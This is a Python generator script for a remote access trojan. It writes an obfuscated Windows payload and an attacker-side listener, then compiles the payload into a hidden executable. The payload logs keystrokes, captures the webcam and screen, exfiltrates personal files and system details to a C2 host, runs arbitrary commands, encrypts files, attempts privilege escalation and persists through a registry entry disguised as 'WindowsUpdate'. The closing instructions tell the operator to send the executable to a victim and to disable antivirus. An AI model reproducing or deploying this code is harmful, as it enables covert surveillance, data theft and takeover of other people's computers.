import os
import base64
import uuid
import socket

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "YOUR_IP_HERE"

YOUR_IP = get_local_ip()
PORT = 4444
LOG_FILE = "victim_data.txt"
KEYLOG_FILE = "keylog.txt"

PAYLOAD_CODE = f'''import socket
import warnings
import subprocess
import os
import sys
import time
import platform
import getpass
import uuid
import json
import winreg
import ctypes
import psutil
import cv2
import pyautogui
from threading import Thread
from pynput import keyboard
import hashlib
import shutil

class VictimControl:
    webcam_count = 0
    screenshot_count = 0
    keylogger_running = False
    keylogger_thread = None
    key_buffer = []

    @staticmethod
    def get_full_info():
        info = {{
            "hostname": platform.node(),
            "username": getpass.getuser(),
            "os": platform.platform(),
            "cpu": {{
                "cores": psutil.cpu_count(),
                "usage": psutil.cpu_percent(interval=1)
            }},
            "ram": psutil.virtual_memory()._asdict(),
            "disks": [psutil.disk_usage(part.mountpoint)._asdict() 
                     for part in psutil.disk_partitions() if part.mountpoint],
            "ip": socket.gethostbyname(socket.gethostname()),
            "mac": ':'.join(['{{:02x}}'.format((uuid.getnode() >> ele) & 0xff) 
                  for ele in range(0,8*6,8)][::-1]),
            "processes": [p.name() for p in psutil.process_iter()][:50]
        }}

        try:
            software = []
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                              r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall") as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, subkey) as subkey_item:
                            name = winreg.QueryValueEx(subkey_item, "DisplayName")[0]
                            version = winreg.QueryValueEx(subkey_item, "DisplayVersion")[0]
                            software.append(f"{{name}} ({{version}})")
                    except:
                        continue
            info["software"] = software
        except:
            info["software"] = ["Could not read registry"]

        recent = []
        for folder in ["Desktop", "Documents", "Downloads"]:
            path = os.path.join(os.path.expanduser("~"), folder)
            if os.path.exists(path):
                recent.extend([f for f in os.listdir(path)[:20] if not f.startswith('.')])
        info["recent_files"] = recent

        return info

    @staticmethod
    def webcam_snapshot():
        try:
            VictimControl.webcam_count += 1
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                filename = f"webcam_{{VictimControl.webcam_count}}.jpg"
                cv2.imwrite(filename, frame)
                with open(filename, "rb") as f:
                    data = base64.b64encode(f.read()).decode()
                os.remove(filename)
                return data
            cam.release()
            return None
        except Exception as e:
            return f"Webcam error: {{str(e)}}"

    @staticmethod
    def take_screenshot():
        try:
            VictimControl.screenshot_count += 1
            filename = f"screen_{{VictimControl.screenshot_count}}.png"
            pyautogui.screenshot(filename)
            with open(filename, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            os.remove(filename)
            return data
        except Exception as e:
            return f"Screenshot error: {{str(e)}}"

    @staticmethod
    def auto_download():
        downloaded = []
        for folder in ["Desktop", "Documents", "Downloads"]:
            path = os.path.join(os.path.expanduser("~"), folder)
            if os.path.exists(path):
                for file in os.listdir(path)[:10]:
                    try:
                        filepath = os.path.join(path, file)
                        if os.path.isfile(filepath) and os.path.getsize(filepath) < 5000000:  # 5MB limit
                            with open(filepath, "rb") as f:
                                downloaded.append({{
                                    "name": file,
                                    "content": base64.b64encode(f.read()).decode(),
                                    "size": os.path.getsize(filepath)
                                }})
                    except:
                        continue
        return downloaded

    @staticmethod
    def encrypt_file(path):
        try:
            with open(path, "rb") as f:
                data = f.read()
            key = hashlib.sha256(b"malware").digest()
            encrypted = bytearray()
            for i in range(len(data)):
                encrypted.append(data[i] ^ key[i % len(key)])
            with open(path + ".enc", "wb") as f:
                f.write(encrypted)
            os.remove(path)
            return f"Encrypted {{path}}"
        except Exception as e:
            return f"Failed to encrypt {{path}}: {{str(e)}}"

    @staticmethod
    def terminate_process(process_name):
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() == process_name.lower():
                    proc.terminate()
                    return f"Terminated {{process_name}}"
            return f"Process {{process_name}} not found"
        except Exception as e:
            return f"Failed to terminate {{process_name}}: {{str(e)}}"

    @staticmethod
    def escalate_privileges():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return "Already running as admin"
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            return "Privilege escalation attempted"
        except Exception as e:
            return f"Privilege escalation failed: {{str(e)}}"

    @classmethod
    def keylogger_loop(cls):
        def on_press(key):
            try:
                char = key.char if hasattr(key, 'char') else f"[{{key}}]"
                cls.key_buffer.append(char)
                if len(cls.key_buffer) >= 10:
                    with open("{KEYLOG_FILE}", "a", encoding='utf-8') as f:
                        f.write("".join(cls.key_buffer) + "\\n")
                    cls.key_buffer = []
            except:
                pass

        with keyboard.Listener(on_press=on_press) as listener:
            while cls.keylogger_running:
                time.sleep(0.1)
            listener.stop()

    @classmethod
    def start_keylogger(cls):
        if not cls.keylogger_running:
            cls.keylogger_running = True
            cls.keylogger_thread = Thread(target=cls.keylogger_loop, daemon=True)
            cls.keylogger_thread.start()
            save_log("[+] Keylogger started")
            return "Keylogger started"
        return "Keylogger already running"

    @classmethod
    def stop_keylogger(cls):
        if cls.keylogger_running:
            cls.keylogger_running = False
            if cls.keylogger_thread:
                cls.keylogger_thread.join(timeout=1)
            cls.keylogger_thread = None
            save_log("[+] Keylogger stopped")
            return "Keylogger stopped"
        return "Keylogger not running"

def save_log(data):
    try:
        with open("{LOG_FILE}", "a", encoding='utf-8') as f:
            f.write(data + "\\n")
    except:
        pass

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        reg_key = winreg.OpenKey(key, path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(reg_key)
        save_log("[+] Added to startup")
    except Exception as e:
        save_log(f"[-] Startup error: {{str(e)}}")

def handle_command(sock, cmd):
    if not cmd.strip():
        return

    try:
        if cmd == "webcam":
            data = VictimControl.webcam_snapshot()
            sock.send(data.encode() if data else b"Webcam error")
            save_log("[+] Webcam snapshot taken")
        elif cmd == "screenshot":
            data = VictimControl.take_screenshot()
            sock.send(data.encode() if data else b"Screenshot error")
            save_log("[+] Screenshot taken")
        elif cmd == "sysinfo":
            data = json.dumps(VictimControl.get_full_info(), indent=4)
            sock.send(data.encode())
            save_log("[+] System info sent")
        elif cmd == "autodownload":
            files = VictimControl.auto_download()
            sock.send(json.dumps(files).encode())
            save_log(f"[+] Downloaded {{len(files)}} files")
        elif cmd.startswith("file_list "):
            path = cmd[9:].strip()
            if not os.path.exists(path):
                sock.send(b"Path does not exist")
                return
            files = os.listdir(path)
            sock.send(json.dumps(files).encode())
            save_log(f"[+] Listed files in {{path}}")
        elif cmd.startswith("file_read "):
            path = cmd[9:].strip()
            if not os.path.exists(path):
                sock.send(b"File does not exist")
                return
            if os.path.getsize(path) > 5000000:  # 5MB limit
                sock.send(b"File too large (max 5MB)")
                return
            with open(path, "rb") as f:
                content = base64.b64encode(f.read()).decode()
                sock.send(content.encode())
                save_log(f"[+] Read file {{path}}")
        elif cmd.startswith("encrypt "):
            path = cmd[7:].strip()
            if not os.path.exists(path):
                sock.send(b"File does not exist")
                return
            data = VictimControl.encrypt_file(path)
            sock.send(data.encode())
            save_log(f"[+] {{data}}")
        elif cmd.startswith("terminate "):
            process_name = cmd[10:].strip()
            data = VictimControl.terminate_process(process_name)
            sock.send(data.encode())
            save_log(f"[+] {{data}}")
        elif cmd == "escalate":
            data = VictimControl.escalate_privileges()
            sock.send(data.encode())
            save_log(f"[+] {{data}}")
        elif cmd == "keylogger start":
            data = VictimControl.start_keylogger()
            sock.send(data.encode())
        elif cmd == "keylogger stop":
            data = VictimControl.stop_keylogger()
            sock.send(data.encode())
        elif cmd == "help":
            help_text = """Available commands:
- sysinfo          - Get system information
- screenshot       - Capture screen
- webcam           - Take webcam photo
- autodownload     - Grab files from Desktop/Documents/Downloads
- file_list [path] - Browse files
- file_read [path] - Download any file
- encrypt [file]   - Encrypt a file (simulation)
- terminate [proc] - Terminate a process
- escalate         - Attempt privilege escalation
- keylogger start  - Start keylogger
- keylogger stop   - Stop keylogger
- cmd [command]    - Execute system command
- exit             - Close connection
- help             - Show this help menu"""
            sock.send(help_text.encode())
        else:
            output = subprocess.getoutput(cmd)
            sock.send(output.encode())
            save_log(f"[+] Command: {{cmd}}\\n{{output}}")
    except Exception as e:
        sock.send(str(e).encode())
        save_log(f"[-] Command failed: {{cmd}}\\nError: {{str(e)}}")

def connect_to_c2():
    while True:
        try:
            s = socket.socket()
            s.settimeout(30)
            print(f"[*] Trying to connect to {YOUR_IP}:{PORT}")  # Debug print
            s.connect(("{YOUR_IP}", {PORT}))
            s.settimeout(None)
            save_log("[+] Connected to C2 server")
            
            s.send(json.dumps(VictimControl.get_full_info()).encode())
            
            while True:
                try:
                    cmd = s.recv(1024).decode().strip()
                    if not cmd:
                        continue
                    if cmd == "exit":
                        VictimControl.stop_keylogger()
                        s.close()
                        return
                    handle_command(s, cmd)
                except socket.timeout:
                    continue
                except Exception as e:
                    save_log(f"[-] Command error: {{str(e)}}")
                    break
        except Exception as e:
            save_log(f"[-] Connection error: {{str(e)}}")
            time.sleep(30)

if __name__ == "__main__":
    hide_console()
    add_to_startup()
    connect_to_c2()
'''

LISTENER_CODE = f'''import socket
import json
import base64
import os
from datetime import datetime

def save_file(content, filename):
    try:
        with open(filename, "wb") as f:
            f.write(base64.b64decode(content))
        return True
    except:
        return False

def start_listener():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', {PORT}))
    s.listen(1)
    print(f"[*] Listening on {YOUR_IP}:{PORT}... (Run payload.exe on target)")
    
    while True:
        try:
            conn, addr = s.accept()
            print(f"[+] Connection from {{addr[0]}}")
            
            try:
                sysinfo = json.loads(conn.recv(999999).decode())
                print("\\n=== SYSTEM INFO ===")
                print(json.dumps(sysinfo, indent=4))
            except:
                print("[!] Could not receive system info")
            
            while True:
                cmd = input("\\nRAT> ")
                if not cmd:
                    continue
                    
                try:
                    conn.send(cmd.encode())
                    
                    if cmd.lower() == "exit":
                        conn.close()
                        break
                        
                    data = conn.recv(9999999).decode()
                    
                    if cmd == "webcam":
                        if save_file(data, f"webcam_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.jpg"):
                            print("[+] Webcam saved")
                        else:
                            print("[!] Failed to save webcam")
                    elif cmd == "screenshot":
                        if save_file(data, f"screen_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png"):
                            print("[+] Screenshot saved")
                        else:
                            print("[!] Failed to save screenshot")
                    elif cmd == "sysinfo":
                        try:
                            print(json.dumps(json.loads(data), indent=4))
                        except:
                            print(data)
                    elif cmd == "autodownload":
                        try:
                            files = json.loads(data)
                            print(f"[+] Downloaded {{len(files)}} files:")
                            for file in files:
                                if save_file(file["content"], file["name"]):
                                    print(f" - {{file['name']}} ({{file['size']}} bytes)")
                                else:
                                    print(f" - Failed to save {{file['name']}}")
                        except:
                            print("[!] Invalid file data received")
                    elif cmd.startswith("file_list"):
                        try:
                            print("Files:", ", ".join(json.loads(data)))
                        except:
                            print(data)
                    elif cmd.startswith("file_read"):
                        filename = input("Save as: ") or "downloaded_file"
                        if save_file(data, filename):
                            print(f"[+] Saved as {{filename}}")
                        else:
                            print("[!] Failed to save file")
                    elif cmd.startswith("encrypt"):
                        print(data)
                    elif cmd.startswith("terminate"):
                        print(data)
                    elif cmd == "escalate":
                        print(data)
                    elif cmd == "keylogger start":
                        print(data)
                    elif cmd == "keylogger stop":
                        print(data)
                    elif cmd == "help":
                        print(data)
                    else:
                        print(data)
                except Exception as e:
                    print(f"[!] Error: {{str(e)}}")
                    break
        except KeyboardInterrupt:
            print("\\n[*] Shutting down...")
            break
        except Exception as e:
            print(f"[!] Listener error: {{str(e)}}")
            continue

if __name__ == "__main__":
    start_listener()
'''

def generate_files():
    print(f"\n[!] IMPORTANT: Make sure your IP is {YOUR_IP}")
    print("[!] If testing on same machine, use 127.0.0.1 as IP")
    print("[!] For LAN connections, ensure both devices are on same network")
    print("[!] For WAN connections, configure port forwarding on router\n")
    
    encoded = base64.b64encode(PAYLOAD_CODE.encode()).decode()
    with open("payload.py", "w") as f:
        f.write(f"import base64\nexec(base64.b64decode('{encoded}').decode())")
    
    with open("listener.py", "w") as f:
        f.write(LISTENER_CODE)
    
    os.system(
        'pyinstaller --onefile --noconsole '
        '--hidden-import=psutil '
        '--hidden-import=cv2 '
        '--hidden-import=pyautogui '
        '--hidden-import=winreg '
        '--hidden-import=ctypes '
        '--hidden-import=pynput.keyboard '
        '--hidden-import=pynput.mouse '
        '--hidden-import=hashlib '
        '--hidden-import=uuid '
        '--log-level=INFO '
        'payload.py'
    )
    
    print(f'''
[✅] RAT TOOL READY

1. Send dist/payload.exe to victim
2. Run python listener.py on your machine ({YOUR_IP}:{PORT})

[🔥] COMMANDS:
- sysinfo          - Get system information
- screenshot       - Capture screen
- webcam           - Take webcam photo
- autodownload     - Grab files from Desktop/Documents/Downloads
- file_list [path] - Browse files
- file_read [path] - Download any file
- encrypt [file]   - Encrypt a file (simulation)
- terminate [proc] - Terminate a process
- escalate         - Attempt privilege escalation
- keylogger start  - Start keylogger
- keylogger stop   - Stop keylogger
- cmd [command]    - Execute system command
- exit             - Close connection
- help             - Show help menu

[⚠️] IMPORTANT:
- Test first on your own machine (use 127.0.0.1)
- Disable antivirus during testing
- Allow firewall access for port {PORT}
''')

if __name__ == "__main__":
    generate_files()
